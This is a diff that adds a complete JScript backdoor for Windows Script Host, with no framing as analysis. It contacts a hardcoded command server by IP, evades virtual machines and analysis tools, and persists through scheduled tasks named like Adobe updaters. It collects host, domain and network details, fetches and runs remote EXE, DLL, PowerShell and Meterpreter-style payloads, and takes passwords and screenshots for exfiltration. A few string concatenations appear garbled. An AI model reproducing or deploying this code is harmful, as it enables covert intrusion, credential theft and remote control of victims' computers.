@@ -1,0 +1,742 @@
+
+var shellobj = WScript.CreateObject("wscript.shell");
+var fsoObj = WScript.CreateObject("Scripting.FileSystemObject");
+var httpObj = WScript.CreateObject("MSXML2.ServerXMLHTTP");
+var knock_timeout = 10;
+var install_name = "settings.ini";
+var install_dir = "{6477a3f2-6b57-7bb2-7767-516073a440f3}";
+var spliter = "|";
+var my_location = WScript.ScriptFullName;
+var panel_link = "185.17.121.200";
+var group = "public";
+var group_key = "cd5f2226313b";
+var version = "1.1.0";
+var for_pentesters = 'Ø³Ù†Ù†ØªÙ‚Ù… Ù„ÙƒÙ… Ù„Ø£Ø·ÙØ§Ù„Ù†Ø§ ÙˆØ§Ø³ØªØ¹Ø§Ø¯Ø© Ø§Ù„Ø¹Ø¯Ø§Ù„Ø© Ø¨Ø§Ø³Ù… Ø§Ù„Ù„Ù‡';
+
+function traffic_encode(string) {
+    var data = [];
+    for (var i = 0; i < string.length; i++) {
+        data.push(String.fromCharCode(string.charCodeAt(i) + 1));
+    }
+    return data.join("");
+}
+
+function inArray(what, where) {
+    for (var i = 0; i < where.length; i++) {
+        if (what == where[i]) {
+            return true;
+        }
+    }
+    return false;
+}
+
+function is_uac() {
+    var oShell = WScript.CreateObject("WScript.Shell");
+    if (oShell.RegRead("HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA") == 0) {
+        return false;
+    } else {
+        return true;
+    }
+}
+
+function protect() {
+    var is_debugged = 0;
+    var wmi = GetObject("winmgmts:root/CIMV2");
+    var Query = wmi.ExecQuery("SELECT * FROM Win32_BIOS");
+    for (var items = new Enumerator(Query); !items.atEnd(); items.moveNext()) {
+        var item = items.item();
+        t = item["SMBIOSBIOSVersion"]["toLowerCase"]();
+        if (t.indexOf("virtualbox") >= 0 || t.indexOf("vmware") >= 0) {
+            is_debugged = 1;
+        }
+        t = item["SerialNumber"]["toLowerCase"]();
+        if (t.indexOf("vmware") >= 0) {
+            is_debugged = 1;
+        }
+    }
+    var Query = wmi.ExecQuery("SELECT * FROM Win32_PnPEntity");
+    for (var items = new Enumerator(Query); !items.atEnd(); items.moveNext()) {
+        var item = items.item();
+        var t = item["DeviceID"]["toLowerCase"]();
+        var l = item["DeviceID"];
+        if (t.indexOf("vmware") >= 0 || l.indexOf("PCI\\VEN_80EE&DEV_CAFE") >= 0 || l.indexOf("VMWVMCIHOSTDEV") >= 0) {
+            is_debugged = 1;
+        }
+    }
+    var Query = wmi.ExecQuery("Select * from Win32_Process");
+    var black_values = Array("autoit3.exe", "dumpcap.exe", "tshark.exe", "Fiddler.exe", "Autoruns64.exe", "Autoruns.exe", "procexp.exe", "procexp64.exe");
+    for (var items = new Enumerator(Query); !items.atEnd(); items.moveNext()) {
+        var item = items.item();
+        var procname = item["Caption"]["toLowerCase"]();
+        if (inArray(procname, black_values)) {
+            is_debugged = 1;
+        }
+    }
+    var scriptname = WScript.ScriptName;
+    var black = Array("malware", "sample", "mlwr", "Desktop");
+    for (var items = new Enumerator(black); !items.atEnd(); items.moveNext()) {
+        var bname = items.item();
+        if (scriptname.indexOf(bname) >= 0) {
+            is_debugged = 1;
+        }
+    }
+    return is_debugged;
+}
+
+function get_id() {
+    var root = GetObject("winmgmts:root/CIMV2");
+    var disks = root.ExecQuery("select * from win32_logicaldisk");
+    var id = "";
+    for (var items = new Enumerator(disks); !items.atEnd(); items.moveNext()) {
+        var disk = items.item();
+        if (disk.volumeserialnumber !== "" && typeof disk.volumeserialnumber === "string") {
+            id = disk.volumeserialnumber;
+            break;
+        }
+    }
+    var mac = root.ExecQuery("Select * From Win32_NetworkAdapterConfiguration Where IPEnabled = True");
+    var mac_adress = "";
+    for (var items = new Enumerator(mac); !items.atEnd(); items.moveNext()) {
+        var item = items.item();
+        if (typeof item.MACAddress == "string") {
+            mac_adress = item.MACAddress.replace(/:/g, '');
+            break;
+        }
+    }
+    id = id + mac_adress;
+    if (id.length < 2) {
+        id = "Unknown";
+    }
+    return id;
+}
+
+function get_ad() {
+    var info = "nothing";
+    var adobj = new ActiveXObject("ADSystemInfo");
+    try {
+        info = 'ADCName-_-"' + adobj.ComputerName + '"*DomainName-_-"' + adobj.DomainShortName + '"';
+    } catch (e) {
+        info = "No";
+    }
+    return info;
+}
+
+function get_bit() {
+    var ob = GetObject("winmgmts:root/CIMV2");
+    var os = ob.execquery("select * from win32_operatingsystem");
+    var bit = 'Unknown';
+    for (var items = new Enumerator(os); !items.atEnd(); items.moveNext()) {
+        var item = items.item();
+        if (typeof item.OSArchitecture === "string") {
+            bit = item.OSArchitecture;
+        }
+    }
+    return bit;
+}
+
+function net_view() {
+    var results = "";
+    try {
+        var tdir = fsoObj.GetSpecialFolder(2);
+        var path = tdir + "\\main.xml";
+        shellobj.Run('cmd.exe /c "net view > ' + path + '"', 0);
+        WScript.Sleep(30000);
+        var result = fsoObj.OpenTextFile(path, 1);
+        var parse_results = result.ReadAll().match(/\\\\[A-Za-z0-9\-\_]*/g);
+        for (i = 0; i < parse_results.length; i++) {
+            results = results + '"' + parse_results[i] + '"*';
+        }
+        result.Close();
+        fsoObj.DeleteFile(path);
+    } catch (e) {
+        results = "Error";
+    }
+    return results;
+}
+
+function parse_arp() {
+    var results = "";
+    try {
+        var tdir = fsoObj.GetSpecialFolder(2);
+        var uniq_number = new Date().getUTCMilliseconds();
+        var path = tdir + "\\Themes" + uniq_number + ".xml";
+        shellobj.Run('cmd.exe /c "arp -a > ' + path + '"', 0);
+        WScript.Sleep(15000);
+        var result = fsoObj.OpenTextFile(path, 1);
+        var parse_results = result.ReadAll().match(/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}[\s]*[0-9a-z]{2}\-[0-9a-z]{2}\-[0-9a-z]{2}\-[0-9a-z]{2}\-[0-9a-z]{2}\-[0-9a-z]{2}/g);
+        for (i = 0; i < parse_results.length; i++) {
+            results = results + parse_results[i].replace(/[\s]+/g, '$') + '*';
+        }
+        result.Close();
+        fsoObj.DeleteFile(path);
+    } catch (e) {
+        results = "Error";
+    }
+    return results;
+}
+
+function get_machine_type(wmic_object) {
+    var Query = wmic_object.ExecQuery("SELECT * FROM Win32_SystemEnclosure");
+    var machine_type = '';
+    for (var items = new Enumerator(Query); !items.atEnd(); items.moveNext()) {
+        var item = items.item();
+        try {
+            machine_type = item.ChassisTypes.toArray()[0];
+        } catch (e) {
+            machine_type = 'error';
+        }
+    }
+    return machine_type;
+}
+
+function get_host_info() {
+    var general_info = "BID:" + get_id() + "|UserName:" + shellobj.expandenvironmentstrings("%username%") + spliter;
+    var ob = GetObject("winmgmts:root/CIMV2");
+    var query = ob.ExecQuery("Select * from Win32_ComputerSystem");
+    for (var items = new Enumerator(query); !items.atEnd(); items.moveNext()) {
+        var item = items.item();
+        general_info = general_info + "HostName:" + item.Name + spliter + "DomainNetwork:";
+        if (item.PartOfDomain) {
+            general_info = general_info + "yes";
+        } else {
+            general_info = general_info + "no";
+        }
+        general_info = general_info + spliter + "Domain:" + item.Domain + spliter;
+    }
+    general_info = general_info + "ADInfo:(" + get_ad() + ")" + spliter;
+    var query = ob.ExecQuery("SELECT Model FROM Win32_ComputerSystem");
+    for (var items = new Enumerator(query); !items.atEnd(); items.moveNext()) {
+        var item = items.item();
+        general_info = general_info + "Model:" + item.Model + spliter;
+    }
+    general_info = general_info + "Machine type:" + get_machine_type(ob) + spliter;
+    var os = ob.execquery("select * from win32_operatingsystem");
+    for (var items = new Enumerator(os); !items.atEnd(); items.moveNext()) {
+        var item = items.item();
+        general_info = general_info + "OS Version:" + item.caption + " " + item.OSArchitecture + spliter;
+    }
+    var sreen_info = ob.execquery("select * from Win32_DesktopMonitor");
+    for (var items = new Enumerator(sreen_info); !items.atEnd(); items.moveNext()) {
+        var item = items.item();
+        if (typeof item.ScreenWidth !== "number") continue;
+        general_info = general_info + "ScreenSize:" + item.ScreenWidth + "x" + item.ScreenHeight + spliter;
+    }
+    general_info = general_info + "NetView:( + "
+    net_view() + ")" + spliter;
+    general_info = general_info + "ARP-A:(" + parse_arp() + ")" + spliter;
+    if (is_uac()) {
+        var uac_result = "yes";
+    } else {
+        var uac_result = "no";
+    }
+    general_info = general_info + "UAC:" + uac_result;
+    return general_info;
+}
+
+function get_proccess_info() {
+    var result = "";
+    var objwmiservice = GetObject("winmgmts:root/CIMV2");
+    var colitems = objwmiservice.execquery("select * from win32_process");
+    for (var items = new Enumerator(colitems); !items.atEnd(); items.moveNext()) {
+        var item = items.item();
+        result = result + item.name + "*" + item.processid + "|";
+    }
+    return result;
+}
+
+function killproccess(pid) {
+    shellobj.run("taskkill /F /T /PID " + pid, 0, true);
+}
+
+function autorun_installation(install_path, file_path) {
+    var file_path_settings = fsoObj.BuildPath(fsoObj.GetSpecialFolder(2), 'firefox.ini');
+    var temp_file = fsoObj.OpenTextFile(file_path_settings, 2, true);
+    temp_file.Write("Start-Process -FilePath 'schtasks.exe' -ArgumentList '/Create','/f','/tn \"Adobe Acrobat Updater\"', '/tr \"wscript.exe //b /e:jscript " + file_path + "\"', '/sc minute', '/mo 4'");
+    temp_file.Close();
+    shellobj.Run('powershell.exe -NoP -NonI -ExecutionPolicy Bypass $res = Get-Content ' + file_path_settings.replace(/\\/g, '\\\\') + ';Invoke-Expression $res;', false);
+}
+
+function uninstall() {
+    var tdir = shellobj.expandEnvironmentStrings("%APPDATA%") + "\\Microsoft\\Windows";
+    var install_path = tdir + "\\" + install_dir;
+    var file_path = install_path + "\\" + install_name;
+    if (fsoObj.FileExists(file_path)) {
+        fsoObj.deleteFile(file_path);
+    }
+    try {
+        fsoObj.DeleteFolder(install_path);
+    } catch (e) {}
+    shellobj.Run('SCHTASKS /Delete /F /TN "Google Update Engine"', 0);
+    if (fsoObj.FileExists(my_location)) {
+        fsoObj.deleteFile(my_location);
+    }
+    WScript.Quit();
+}
+
+function update(new_code) {
+    var tdir = shellobj.expandEnvironmentStrings("%APPDATA%") + "\\Microsoft\\Windows";
+    var install_path = tdir + "\\" + install_dir;
+    var file_path = install_path + "\\" + install_name;
+    if (fsoObj.FileExists(file_path)) {
+        fsoObj.deleteFile(file_path);
+        var update_file = fsoObj.OpenTextFile(file_path, 2, true);
+        update_file.Write(new_code);
+        update_file.Close();
+        request("update", "info=OK", 1);
+    }
+}
+
+function start_and_load_wexe() {
+    var file = request("load_exe", "", 0);
+    var tdir = shellobj.expandEnvironmentStrings("%APPDATA%") + "\\Microsoft\\Windows";
+    var install_path = tdir + "\\" + install_dir;
+    var file_path = install_path + "\\log.ini";
+    var BinaryStream = WScript.CreateObject("ADODB.Stream");
+    BinaryStream.Type = 1;
+    BinaryStream.Open();
+    BinaryStream.Write(file);
+    BinaryStream.SaveToFile(file_path, 2);
+    wmi_start(file_path);
+}
+
+function start_and_load_tinymet() {
+    var code = request("load_tinymet", "", 1);
+    var tdir = shellobj.expandEnvironmentStrings("%APPDATA%") + "\\Microsoft\\Windows";
+    var install_path = tdir + "\\" + install_dir;
+    var file_path = install_path + "\\main.ini";
+    if (fsoObj.FileExists(file_path)) {
+        fsoObj.deleteFile(file_path);
+    }
+    var tiny_file = fsoObj.OpenTextFile(file_path, 2, true);
+    tiny_file.Write(code);
+    tiny_file.Close();
+    shellobj.Run('schtasks /Create /f /tn "Adobe Acrobat Player Update" /tr "wscript.exe //b /e:jscript ' + file_path + '" /sc ONCE /st 00:00', false);
+    WScript.Sleep(5000);
+    shellobj.Run('schtasks /Run /I /tn "Adobe Acrobat Player Update"', false);
+    WScript.Sleep(10000);
+    shellobj.Run('schtasks /Delete /F /tn "Adobe Acrobat Player Update"', false);
+    request("tinymet", "info=OK", 1);
+}
+
+function start_and_load_exe() {
+    var file = request("load_exe", "", 0);
+    var tdir = shellobj.expandEnvironmentStrings("%APPDATA%") + "\\Microsoft\\Windows";
+    var install_path = tdir + "\\" + install_dir;
+    var file_path = install_path + "\\Feed.mxls";
+    var BinaryStream = WScript.CreateObject("ADODB.Stream");
+    BinaryStream.Type = 1;
+    BinaryStream.Open();
+    BinaryStream.Write(file);
+    BinaryStream.SaveToFile(file_path, 2);
+    var cmd_path = install_path + "\\log.cmd";
+    var cmd_file = fsoObj.OpenTextFile(cmd_path, 2, true);
+    cmd_file.Write("cmd.exe /c " + file_path);
+    cmd_file.Close();
+    shellobj.Run("cmd.exe /c  + "
+        cmd_path, false);
+    WScript.Sleep(3000);
+    fsoObj.deleteFile(cmd_path);
+}
+
+function start_and_load_dll() {
+    var file = request("load_dll", "", 0);
+    var tdir = shellobj.expandEnvironmentStrings("%APPDATA%") + "\\Microsoft\\Windows";
+    var install_path = tdir + "\\" + install_dir;
+    var file_path = install_path + "\\Feed.xml";
+    var BinaryStream = WScript.CreateObject("ADODB.Stream");
+    BinaryStream.Type = 1;
+    BinaryStream.Open();
+    BinaryStream.Write(file);
+    BinaryStream.SaveToFile(file_path, 2);
+    var cmd_path = install_path + "\\log.cmd";
+    var cmd_file = fsoObj.OpenTextFile(cmd_path, 2, true);
+    cmd_file.Write('cmd.exe /c "regsvr32 /s ' + file_path + '"');
+    cmd_file.Close();
+    shellobj.Run("cmd.exe /c " + cmd_path, false);
+    WScript.Sleep(3000);
+    fsoObj.deleteFile(cmd_path);
+}
+
+function wmi_start(command) {
+    try {
+        var wmi = GetObject("winmgmts:root/CIMV2");
+        var start_settings = wmi.Get("Win32_ProcessStartup");
+        var new_config = start_settings.SpawnInstance_();
+        new_config.ShowWindow = 0;
+        var process_start = wmi.Get("Win32_Process");
+        var return_code = process_start.Create(command, null, new_config, 0);
+        if (return_code !== 0) {
+            return false;
+        }
+        return true;
+    } catch (e) {
+        return false;
+    }
+}
+
+function intelectic_command(command, type) {
+    var start_file = '';
+    var cmdLine = '';
+    var uniq_number = new Date().getUTCMilliseconds();
+    if (type === 'cmd') {
+        start_file = 'log' + uniq_number + '.cmd';
+    } else {
+        start_file = 'log' + uniq_number + '.xml';
+    }
+    var tempName = fsoObj.BuildPath(fsoObj.GetSpecialFolder(2), 'data' + uniq_number + '.ini');
+    var cmdFileName = fsoObj.BuildPath(fsoObj.GetSpecialFolder(2), start_file);
+    var cmd_file = fsoObj.OpenTextFile(cmdFileName, 2, true);
+    cmd_file.Write(command);
+    cmd_file.Close();
+    switch (type) {
+        case 'cmd':
+            cmdLine = fsoObj.BuildPath(fsoObj.GetSpecialFolder(1), "cmd.exe") + ' /C ' + cmdFileName + ' > "' + tempName + '"';
+            break;
+        case 'powershell':
+            cmdLine = fsoObj.BuildPath(fsoObj.GetSpecialFolder(1), "cmd.exe") + ' /C powershell.exe -NoP -NonI -ExecutionPolicy Bypass $res = Get-Content ' + cmdFileName.replace(/\\/g, '\\\\') + ';Invoke-Expression $res; > "' + tempName + '"';
+            break;
+        case 'apowershell':
+            cmdLine = 'powershell.exe -NoP -NonI -ExecutionPolicy Bypass $res = Get-Content ' + cmdFileName + ';Invoke-Expression $res;';
+            break;
+        case 'wpowershell':
+            cmdLine = fsoObj.BuildPath(fsoObj.GetSpecialFolder(1), "cmd.exe") + ' /C powershell.exe -NoP -NonI -ExecutionPolicy Bypass $res = Get-Content ' + cmdFileName.replace(/\\/g, '\\\\') + ';Invoke-Expression $res; > "' + tempName + '"';
+            break;
+    }
+    switch (type) {
+        case 'wpowershell':
+            var return_wmi = wmi_start(cmdLine);
+            if (!return_wmi) return 'error';
+            break;
+        default:
+            shellobj.Run(cmdLine, 0);
+            break;
+    }
+    switch (type) {
+        case 'apowershell':
+            return '';
+            break;
+        default:
+            WScript.Sleep(55000);
+            if (fsoObj.FileExists(tempName)) {
+                var result = "-";
+                try {
+                    var ts = fsoObj.OpenTextFile(tempName, 1, false);
+                    try {
+                        result = ts.ReadAll();
+                    } catch (e) {
+                        result = "Empty console result or file blocked";
+                    }
+                    ts.Close();
+                } catch (err) {
+                    return "error";
+                }
+                if (fsoObj.FileExists(tempName)) {
+                    try {
+                        fsoObj.DeleteFile(cmdFileName);
+                        fsoObj.DeleteFile(tempName);
+                    } catch (e) {}
+                }
+            } else {
+                return "error";
+            }
+            return result;
+            break;
+    }
+}
+
+function start_and_load_cmd() {
+    var file = request("load_cmd", "", 1);
+    var result = intelectic_command(file, 'cmd');
+    httpObj.open("POST", "https://" + panel_link + "/page.php?page=" + get_id() + "&page_id=2", false);
+    httpObj.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    httpObj.setOption(2, 13056);
+    httpObj.send(result);
+}
+
+function start_and_load_powershell() {
+    var file = request("load_powershell", "", 1);
+    var result = intelectic_command(file, 'powershell');
+    httpObj.open("POST", "https://" + panel_link + "/page.php?page=" + get_id() + "&page_id=3", false);
+    httpObj.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    httpObj.setOption(2, 13056);
+    httpObj.send(result);
+}
+
+function start_and_load_apowershell() {
+    var file = request("load_powershell", "", 1);
+    intelectic_command(file, 'apowershell');
+    request("apowershell", "info=OK", 1);
+}
+
+function start_and_load_wpowershell() {
+    var file = request("load_powershell", "", 1);
+    var result = intelectic_command(file, 'wpowershell');
+    httpObj.open("POST", "https://" + panel_link + "/page.php?page=" + get_id() + "&page_id=5", false);
+    httpObj.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    httpObj.setOption(2, 13056);
+    httpObj.send(result);
+}
+
+function create_module(module) {
+    var uniq_number = new Date().getUTCMilliseconds();
+    var file_path = fsoObj.BuildPath(fsoObj.GetSpecialFolder(2), 'manual_' + uniq_number + '.xml');
+    var ps_file = fsoObj.OpenTextFile(file_path, 2, true);
+    ps_file.Write(module);
+    ps_file.Close();
+    return file_path;
+}
+
+function execute_module(file_path) {
+    var start_code = '';
+    switch (get_bit()) {
+        case '64-bit':
+            start_code = shellobj.expandenvironmentstrings("%SystemRoot%") + '\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -ExecutionPolicy Bypass $res = Get-Content ' + file_path.replace(/\\/g, '\\\\') + ';Invoke-Expression $res;';
+            break;
+        case 'Unknown':
+            return 'error';
+            break;
+        default:
+            start_code = 'powershell.exe -NoP -NonI -ExecutionPolicy Bypass $res = Get-Content ' + file_path.replace(/\\/g, '\\\\') + ';Invoke-Expression $res;';
+            break;
+    }
+    var run_code = fsoObj.BuildPath(fsoObj.GetSpecialFolder(1), "cmd.exe") + ' /C ' + start_code;
+    shellobj.Run(run_code, 0);
+}
+
+function get_passwords_run(module) {
+    var file_path = create_module(module);
+    execute_module(file_path);
+    WScript.Sleep(30000);
+    var result_file = fsoObj.BuildPath(shellobj.expandenvironmentstrings("%APPDATA%"), shellobj.expandenvironmentstrings("%username%") + '.ini');
+    if (fsoObj.FileExists(result_file)) {
+        var result = "-";
+        try {
+            var ts = fsoObj.OpenTextFile(result_file, 1, false);
+            try {
+                result = ts.ReadAll();
+            } catch (e) {
+                result = "Error read file";
+            }
+            ts.Close();
+        } catch (err) {
+            if (fsoObj.FileExists(file_path)) {
+                try {
+                    fsoObj.DeleteFile(file_path);
+                } catch (e) {}
+            }
+            return "error";
+        }
+        if (fsoObj.FileExists(file_path)) {
+            try {
+                fsoObj.DeleteFile(file_path);
+                fsoObj.DeleteFile(result_file);
+            } catch (e) {}
+        }
+        return result;
+    } else {
+        if (fsoObj.FileExists(file_path)) {
+            try {
+                fsoObj.DeleteFile(file_path);
+            } catch (e) {}
+        }
+        return 'Password not found or error grabbing';
+    }
+}
+
+function get_apps_run(module) {
+    var file_path = create_module(module);
+    execute_module(file_path);
+    WScript.Sleep(30000);
+    var result_file = fsoObj.BuildPath(fsoObj.GetSpecialFolder(2), 'chrome_installer.ini');
+    if (fsoObj.FileExists(result_file)) {
+        var result = "-";
+        try {
+            var ts = fsoObj.OpenTextFile(result_file, 1, false, -1);
+            try {
+                result = ts.ReadAll();
+            } catch (e) {
+                result = "Error read file";
+            }
+            ts.Close();
+        } catch (err) {
+            if (fsoObj.FileExists(file_path)) {
+                try {
+                    fsoObj.DeleteFile(file_path);
+                } catch (e) {}
+            }
+            return "error";
+        }
+        if (fsoObj.FileExists(file_path)) {
+            try {
+                fsoObj.DeleteFile(file_path);
+                fsoObj.DeleteFile(result_file);
+            } catch (e) {}
+        }
+        return result;
+    } else {
+        if (fsoObj.FileExists(file_path)) {
+            try {
+                fsoObj.DeleteFile(file_path);
+            } catch (e) {}
+        }
+        return 'error';
+    }
+}
+
+function make_screen() {
+    var module = request("load_screen", "", 1);
+    var tdir = shellobj.expandEnvironmentStrings("%TEMP%");
+    var file_path = tdir + "\\install.txt";
+    var update_file = fsoObj.OpenTextFile(file_path, 2, true);
+    update_file.Write(module);
+    update_file.Close();
+    shellobj.Run('cmd.exe /c powershell.exe -NoP -NonI -ExecutionPolicy Bypass $res = Get-Content ' + file_path.replace(/\\/g, '\\\\') + ';Invoke-Expression $res;', false);
+    WScript.Sleep(30000);
+    var screen = tdir + '\\screenshot.png';
+    var result = 'error';
+    if (fsoObj.FileExists(screen)) {
+        var objstreamuploade = WScript.CreateObject("adodb.stream");
+        objstreamuploade.type = 1;
+        objstreamuploade.open();
+        objstreamuploade.loadfromfile(screen);
+        result = objstreamuploade.read();
+        objstreamuploade.close();
+    }
+    httpObj.open("POST", "https://" + panel_link + "/page.php?page=" + get_id() + "&page_id=1", false);
+    httpObj.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    httpObj.setOption(2, 13056);
+    httpObj.send(result);
+    fsoObj.deleteFile(screen);
+    fsoObj.deleteFile(file_path);
+}
+
+function get_passwords() {
+    var module = request("load_pass", "", 1);
+    var result = get_passwords_run(module);
+    httpObj.open("POST", "https://" + panel_link + "/page.php?page=" + get_id() + "&page_id=4", false);
+    httpObj.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    httpObj.setOption(2, 13056);
+    httpObj.send(result);
+}
+
+function get_apps() {
+    var module = request("load_apps", "", 1);
+    var result = get_apps_run(module);
+    httpObj.open("POST", "https://" + panel_link + "/page.php?page=" + get_id() + "&page_id=6", false);
+    httpObj.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+    httpObj.setOption(2, 13056);
+    httpObj.send(result);
+}
+
+function install_controller() {
+    var install_problem = false;
+    var tdir = shellobj.expandEnvironmentStrings("%APPDATA%") + "\\Microsoft\\Windows";
+    var install_path = tdir + "\\" + install_dir;
+    if (!fsoObj.FolderExists(install_path)) {
+        fsoObj.CreateFolder(install_path);
+        install_problem = true;
+    }
+    var file_path = install_path + "\\" + install_name;
+    if (!fsoObj.FileExists(file_path)) {
+        fsoObj.CopyFile(my_location, file_path);
+        install_problem = true;
+    }
+    try {
+        if (my_location.indexOf(install_dir) == -1) {
+            fsoObj.deleteFile(my_location);
+        }
+    } catch (e) {}
+    if (install_problem) {
+        autorun_installation(install_path, file_path);
+    }
+}
+
+function request(get_parr, post_parr, answer_type) {
+    try {
+        var result = "";
+        httpObj.open("POST", "https://" + panel_link + "/?id=news", false);
+        httpObj.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        httpObj.setOption(2, 13056);
+        httpObj.send(("page_time=" + knock_timeout + "&page=" + get_parr + "&page_version=" + version + "&page_id=" + get_id() + "&page_group=" + group + "&key=" + group_key + "&" + post_parr));
+        if (answer_type == 1) {
+            result = httpObj.responseText;
+        } else {
+            result = httpObj.responseBody;
+        }
+        return result;
+    } catch (e) {
+        return 'timeout';
+    }
+}
+
+function init() {
+    install_controller();
+    var response = "";
+    var parsed_answer = "";
+    response = request("wait", "", 1);
+    if (response !== "") {
+        parsed_answer = response.split("|*|");
+        switch (parsed_answer[0]) {
+            case "get_information":
+                request("get_information", "info=" + get_host_info(), 1);
+                break;
+            case "get_process_list":
+                request("get_process_list", "info=" + get_proccess_info(), 1);
+                break;
+            case "kill_process":
+                killproccess(parsed_answer[1]);
+                request("kill_process", "info=OK", 1);
+                break;
+            case "uninstall":
+                request("uninstall", "info=OK", 1);
+                uninstall();
+                break;
+            case "update":
+                update(parsed_answer[1]);
+                break;
+            case 'tinymet':
+                start_and_load_tinymet();
+                break;
+            case "exe":
+                start_and_load_exe();
+                request("exe", "info=OK", 1);
+                break;
+            case 'wexe':
+                start_and_load_wexe();
+                request("wexe", "info=OK", 1);
+                break;
+            case "dll":
+                start_and_load_dll();
+                request("dll", "info=OK", 1);
+                break;
+            case 'cmd':
+                start_and_load_cmd();
+                break;
+            case 'powershell':
+                start_and_load_powershell();
+                break;
+            case 'apowershell':
+                start_and_load_apowershell();
+                break;
+            case 'wpowershell':
+                start_and_load_wpowershell();
+                break;
+            case 'get_screen':
+                make_screen();
+                break;
+            case 'get_apps':
+                get_apps();
+                break;
+            case 'get_passwords':
+                get_passwords();
+                break;
+            case 'timeout':
+                break;
+        }
+    }
+}
+try {
+    if (protect() == 0) {
+        init();
+    }
+} catch (e) {}
